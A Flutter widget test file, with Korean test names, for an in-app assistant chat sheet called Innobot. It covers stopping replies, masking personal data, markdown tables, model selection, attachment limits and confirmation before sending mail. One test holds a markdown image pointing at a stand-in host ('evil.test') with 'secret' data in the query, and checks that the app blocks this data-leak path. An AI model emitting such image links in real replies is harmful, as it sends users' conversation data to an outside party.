import 'dart:async';
import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:playground/api/client.dart';
import 'package:playground/assistant/assistant_sheet.dart';
import 'package:playground/assistant/chat_api.dart' show attachmentPickerProvider;
import 'package:playground/assistant/innobot_button.dart';
import 'package:playground/gw/gw_client.dart';
import 'package:playground/gw/gw_creds.dart';
import 'package:shared_preferences/shared_preferences.dart';
import '../gw/fakes.dart';
import 'assistant_session_test.dart' show say, use, scenarioGw;
import 'chat_brain.dart';

Widget host(ChatBrain brain, Widget child, {List<({String name, List<int> bytes})> picked = const []}) => ProviderScope(
  key: UniqueKey(),
  overrides: [
    attachmentPickerProvider.overrideWithValue(() async => [for (final f in picked) (name: f.name, size: f.bytes.length, read: () async => f.bytes)]),
    apiClientProvider.overrideWithValue(brain.client),
    gwStoreProvider.overrideWithValue(FakeGwStore(testCreds)),
    gwHttpClientProvider.overrideWithValue(scenarioGw().client),
  ],
  child: MaterialApp(
    home: Scaffold(body: Stack(children: [const SizedBox.expand(), child])),
  ),
);

void main() {
  setUp(() => SharedPreferences.setMockInitialValues({}));

  testWidgets('생각하는 동안 중지 버튼을 누르면 입력이 다시 활성화된다', (tester) async {
    final wait = Completer<void>();
    final brain = ChatBrain([say('늦은 응답')], waitForTurn: wait.future);
    await tester.pumpWidget(host(brain, const AssistantSheet()));
    await tester.enterText(find.byType(TextField), '대기 요청');
    await tester.tap(find.byTooltip('보내기'));
    await tester.pump();
    expect(find.byTooltip('응답 중지'), findsOneWidget);
    await tester.tap(find.byTooltip('응답 중지'));
    await tester.pumpAndSettle();
    expect(tester.widget<TextField>(find.byType(TextField)).enabled ?? true, true); // 입력창은 늘 활성(답 기다리는 중에도 — 포커스 유지)
    expect(find.byTooltip('보내기'), findsOneWidget);
    expect(find.text('생각하는 중…'), findsNothing);
    wait.complete();
    await tester.pumpAndSettle();
    expect(find.text('늦은 응답'), findsNothing);
  });

  testWidgets('도구 칩(결과 요약·완료 아이콘)과 가린 개인정보 건수가 보인다', (tester) async {
    final brain = ChatBrain([use([('s1', 'teams_chats', {})]), say('있어요')]);
    await tester.pumpWidget(host(brain, const AssistantSheet()));
    await tester.enterText(find.byType(TextField), '010-1234-5678 채팅 목록');
    await tester.tap(find.byTooltip('보내기'));
    await tester.pumpAndSettle();
    expect(find.text('teams_chats 완료'), findsOneWidget);
    expect(find.byIcon(Icons.check_circle), findsOneWidget);
    expect(find.text('개인정보 1건 가림'), findsOneWidget);
    expect(find.byIcon(Icons.shield_outlined), findsOneWidget);
  });

  testWidgets('이노봇 답은 마크다운(굵게·표)으로 그리고, 읽어 주기는 기호를 뺀 글로', (tester) async {
    final brain = ChatBrain([say('**요약**\n\n| 이름 | 팀 |\n|---|---|\n| 강 | 플랫폼 |')]);
    await tester.pumpWidget(host(brain, const AssistantSheet()));
    await tester.enterText(find.byType(TextField), '표로');
    await tester.tap(find.byTooltip('보내기'));
    await tester.pumpAndSettle();
    expect(find.byType(Table), findsOneWidget);
    expect(find.textContaining('**'), findsNothing);
    expect(find.textContaining('플랫폼', findRichText: true), findsOneWidget);
  });

  testWidgets('모델 — 선택지가 둘 이상이면 머리에 고르는 단추, 고르면 그 모델로 보낸다', (tester) async {
    final brain = ChatBrain([say('네')])..config = {'enabled': true, 'models': ['claude-sonnet-5-5', 'claude-opus-5-5'], 'defaultModel': 'claude-sonnet-5-5'};
    await tester.pumpWidget(host(brain, const AssistantSheet()));
    await tester.pumpAndSettle();
    await tester.tap(find.byTooltip('모델 고르기'));
    await tester.pumpAndSettle();
    await tester.tap(find.text('Opus 5.5').last);
    await tester.pumpAndSettle();
    expect(find.text('Opus 5.5'), findsOneWidget);
    await tester.enterText(find.byType(TextField), '안녕');
    await tester.tap(find.byTooltip('보내기'));
    await tester.pumpAndSettle();
    expect(brain.bodies.last['model'], 'claude-opus-5-5');
  });

  testWidgets('모델 — 선택지가 하나면 단추를 숨긴다', (tester) async {
    await tester.pumpWidget(host(ChatBrain([]), const AssistantSheet()));
    await tester.pumpAndSettle();
    expect(find.byTooltip('모델 고르기'), findsNothing);
  });

  testWidgets('첨부 — 고르면 바로 올려 칩으로, 빼기, 보내면 attachmentIds와 말풍선 이름, 거절은 칩에 이유', (tester) async {
    final brain = ChatBrain([say('읽었어요')]);
    await tester.pumpWidget(host(brain, const AssistantSheet(), picked: [(name: '보고서.pdf', bytes: [1]), (name: '사진.png', bytes: [2]), (name: '나쁜.exe', bytes: [3])]));
    await tester.tap(find.byTooltip('파일 첨부'));
    await tester.pumpAndSettle();
    expect(brain.uploads, ['보고서.pdf', '사진.png']);
    expect(find.text('보고서.pdf'), findsOneWidget);
    expect(find.textContaining('exe 파일은 첨부할 수 없는 형식입니다'), findsOneWidget);
    expect(find.text('이미지·스캔 문서 안의 개인정보는 가려지지 않습니다.'), findsOneWidget);
    await tester.tap(find.byTooltip('사진.png 빼기'));
    await tester.pumpAndSettle();
    await tester.enterText(find.byType(TextField), '요약해 줘');
    await tester.tap(find.byTooltip('보내기'));
    await tester.pumpAndSettle();
    expect(brain.bodies.last['attachmentIds'], ['a1']);
    expect(find.byTooltip('보고서.pdf 빼기'), findsNothing, reason: '보낸 뒤 입력창 칩은 비운다');
    expect(find.text('보고서.pdf'), findsOneWidget, reason: '말풍선에 첨부 이름');
  });

  testWidgets('첨부 — 5개까지, 10MB를 넘으면 올리지 않고 안내', (tester) async {
    final brain = ChatBrain([]);
    await tester.pumpWidget(host(brain, const AssistantSheet(), picked: [
      for (var i = 0; i < 6; i++) (name: 'f$i.txt', bytes: [i]),
    ]));
    await tester.tap(find.byTooltip('파일 첨부'));
    await tester.pumpAndSettle();
    expect(brain.uploads, hasLength(5));
    expect(find.text('첨부는 5개까지입니다.'), findsOneWidget);
    await tester.pumpWidget(host(brain, const AssistantSheet(), picked: [(name: '큰.pdf', bytes: List.filled(10 * 1024 * 1024 + 1, 0))]));
    await tester.tap(find.byTooltip('파일 첨부'));
    await tester.pumpAndSettle();
    expect(brain.uploads, hasLength(5));
    expect(find.textContaining('10MB까지'), findsOneWidget);
  });

  testWidgets('마크다운 이미지는 불러오지 않는다(외부 주소로 대화 내용이 새는 경로) — 대체 글만', (tester) async {
    final brain = ChatBrain([say('요약 ![로고](https://evil.test/p?d=secret) 끝')]);
    await tester.pumpWidget(host(brain, const AssistantSheet()));
    await tester.enterText(find.byType(TextField), '요약');
    await tester.tap(find.byTooltip('보내기'));
    await tester.pumpAndSettle();
    expect(find.byWidgetPredicate((w) => w is Image && w.image is NetworkImage), findsNothing);
    expect(find.textContaining('[이미지: 로고]', findRichText: true), findsOneWidget);
  });

  testWidgets('넓은 표는 넘치지 않고 가로로 밀어 본다', (tester) async {
    final row = List.filled(8, '아주 긴 칸 내용입니다').join(' | ');
    final brain = ChatBrain([say('| ${List.generate(8, (i) => '열$i').join(' | ')} |\n|${List.filled(8, '---').join('|')}|\n| $row |')]);
    await tester.pumpWidget(host(brain, const AssistantSheet()));
    await tester.enterText(find.byType(TextField), '넓은 표');
    await tester.tap(find.byTooltip('보내기'));
    await tester.pumpAndSettle();
    expect(find.byType(Table), findsOneWidget);
    expect(find.ancestor(of: find.byType(Table), matching: find.byWidgetPredicate((w) => w is SingleChildScrollView && w.scrollDirection == Axis.horizontal)), findsOneWidget);
  });

  test('speakableText — 마크다운 기호를 뺀 읽을 글', () {
    expect(speakableText('## 제목\n**굵게** 와 `코드`, [링크](https://x.test)\n\n| 이름 | 팀 |\n|---|---|\n| 강 | 플랫폼 |\n- 하나'), '제목\n굵게 와 코드, 링크\n\n이름, 팀\n강, 플랫폼\n하나');
  });

  testWidgets('seed가 있으면 열리자마자 그 문장을 보내고 말풍선으로 남긴다(일정 화면 "추가")', (tester) async {
    final brain = ChatBrain([say('어떤 일정인가요? 제목과 시간을 알려 주세요.')]);
    await tester.pumpWidget(host(brain, Builder(builder: (context) => TextButton(onPressed: () => showAssistantSheet(context, seed: '10월 12일 (월)에 아마란스 일정 등록해줘. 제목·시간·장소를 물어봐 줘.'), child: const Text('추가')))));
    await tester.tap(find.text('추가'));
    await tester.pumpAndSettle();
    expect(brain.received, hasLength(1));
    expect('${brain.received.single.last['content']}', contains('10월 12일 (월)에 아마란스 일정 등록해줘'));
    expect(find.text('10월 12일 (월)에 아마란스 일정 등록해줘. 제목·시간·장소를 물어봐 줘.'), findsOneWidget);
    expect(find.text('어떤 일정인가요? 제목과 시간을 알려 주세요.'), findsOneWidget);
  });

  testWidgets('대화창을 다시 열면 마지막 대화가 보인다', (tester) async {
    final brain = ChatBrain([say(List.filled(60, '긴 대화').join('\n'))]);
    await tester.pumpWidget(host(brain, const InnobotButton()));
    await tester.tap(find.byTooltip('비서 이노봇'));
    await tester.pumpAndSettle();
    await tester.tap(find.text('오늘 내 일정 알려줘'));
    await tester.pumpAndSettle();
    Navigator.of(tester.element(find.byType(AssistantSheet))).pop();
    await tester.pumpAndSettle();
    await tester.tap(find.byTooltip('비서 이노봇'));
    await tester.pumpAndSettle();
    final scroll = tester.widget<ListView>(find.byType(ListView)).controller!;
    expect(scroll.offset, scroll.position.maxScrollExtent);
    expect(scroll.offset, greaterThan(0));
  });

  testWidgets('이노봇 버튼 → 시트: 인사·예시 칩, 칩을 누르면 보내고 답이 말풍선으로', (tester) async {
    final brain = ChatBrain([say('오늘 일정은 없습니다.')]);
    await tester.pumpWidget(host(brain, const InnobotButton()));
    await tester.tap(find.byTooltip('비서 이노봇'));
    await tester.pumpAndSettle();
    expect(find.byTooltip('대화 기록'), findsOneWidget);
    expect(find.text('무엇을 도와드릴까요?'), findsOneWidget);
    expect(find.text('오늘 내 일정 알려줘'), findsOneWidget);
    expect(
      find.text(
        '오늘 오후 빈 회의실 1시간 잡고, 그에 맞는 일정을 등록해줘, 회의명은 내부회의, 참석자는 우리팀 전원. 캘린더는 이노그리드로 해줘',
      ),
      findsOneWidget,
    );
    await tester.tap(find.text('오늘 내 일정 알려줘'));
    await tester.pumpAndSettle();
    expect(find.text('오늘 일정은 없습니다.'), findsOneWidget);
    expect(brain.received.single.single['content'], '오늘 내 일정 알려줘');
  });

  testWidgets('쓰기 → 확인 카드(실행·고쳐 줘·그만두기), 메일 발송은 경고 문구', (tester) async {
    final brain = ChatBrain([
      use([
        (
          'm',
          'mail_send',
          {
            'to': ['a@x'],
            'subject': '회의록',
            'body': '본문',
          },
        ),
      ]),
      say('취소했습니다.'),
    ]);
    await tester.pumpWidget(host(brain, const AssistantSheet()));
    await tester.enterText(find.byType(TextField), '회의록 보내줘');
    await tester.tap(find.byTooltip('보내기'));
    await tester.pumpAndSettle();
    expect(find.textContaining("제목 '회의록'"), findsOneWidget);
    expect(find.text('보내면 되돌릴 수 없습니다'), findsOneWidget);
    for (final l in ['실행', '고쳐 줘', '그만두기']) {
      expect(find.text(l), findsOneWidget);
    }
    await tester.tap(find.text('그만두기'));
    await tester.pumpAndSettle();
    expect(find.text('그만두었습니다'), findsOneWidget);
    expect(find.text('취소했습니다.'), findsOneWidget);
  });

  testWidgets('새 대화는 기록을 비운다', (tester) async {
    final brain = ChatBrain([say('네.')]);
    await tester.pumpWidget(host(brain, const AssistantSheet()));
    await tester.enterText(find.byType(TextField), '안녕');
    await tester.tap(find.byTooltip('보내기'));
    await tester.pumpAndSettle();
    expect(find.text('네.'), findsOneWidget);
    await tester.tap(find.byTooltip('새 대화'));
    await tester.pumpAndSettle();
    expect(find.text('네.'), findsNothing);
    expect(find.text('무엇을 도와드릴까요?'), findsOneWidget);
  });

  testWidgets('비서가 꺼져 있으면(서버 enabled:false) 이노봇 버튼을 숨긴다', (tester) async {
    final brain = ChatBrain([
      {'enabled': false},
    ]);
    await tester.pumpWidget(host(brain, const InnobotButton()));
    await tester.tap(find.byTooltip('비서 이노봇'));
    await tester.pumpAndSettle();
    await tester.tap(find.text('오늘 내 일정 알려줘'));
    await tester.pumpAndSettle();
    expect(find.text('관리자가 비서를 꺼 두었습니다.'), findsOneWidget);
    Navigator.of(tester.element(find.text('관리자가 비서를 꺼 두었습니다.'))).pop();
    await tester.pumpAndSettle();
    expect(find.byTooltip('비서 이노봇'), findsNothing);
  });
}
